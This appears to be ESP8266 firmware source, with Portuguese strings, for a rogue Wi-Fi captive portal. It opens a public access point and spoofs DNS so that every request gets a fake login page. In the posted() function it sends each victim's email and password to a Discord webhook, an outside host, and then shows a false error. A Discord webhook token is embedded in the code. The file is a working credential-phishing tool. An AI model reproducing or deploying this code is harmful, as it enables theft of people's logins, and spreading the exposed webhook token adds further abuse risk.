#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include "./includes/discordwh.h"
#include "./pages/index.h"

const char * SSID_NAME = "SSID-PUBLICO";

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);

const char * ssid = "SSID-DA-SUA-REDE-WIFI";
const char * pass = "PASSWORD-DA-SUA-REDE-WIFI";

String currentSSID = "";

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.replace("`", "");
  a.replace("*", "");
  a.substring(0, 200);
  return a;
}

String posted() {
  String email = input("email");
  String password = input("password");
  DSend("**[Login] - Usuário: `"+email+"` | Senha: `"+password+"`**", "/api/webhooks/886782078493028382/Zn_vvhn_y_OjcU1AGoiDx29mPU2ILC-MWIxDIHfF100XaRuVEeowT4n0_Ash6dguLJNN");
  return "<h1>Erro - Acesso não autorizado!</h1>";
}

void BLINK() {
  for (int counter = 0; counter < 10; counter++) {
    digitalWrite(BUILTIN_LED, counter % 2);
    delay(500);
  }
}


void setup() {
  Serial.begin(115200);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

  WiFi.begin(ssid, pass);
  bootTime = lastActivity = millis();

  delay(10);

  Serial.print("\n\nConnecting");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }

  Serial.println();

  Serial.print("Connected, IP address: ");
  Serial.print(WiFi.localIP());

  client.setFingerprint(fingerprint);

  String ESSID;
  currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

  Serial.print("\nCurrent SSID: ");
  Serial.print(currentSSID);
  WiFi.softAP(currentSSID);

  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
  webServer.on("/login", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index_page);
  });
  webServer.begin();

  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
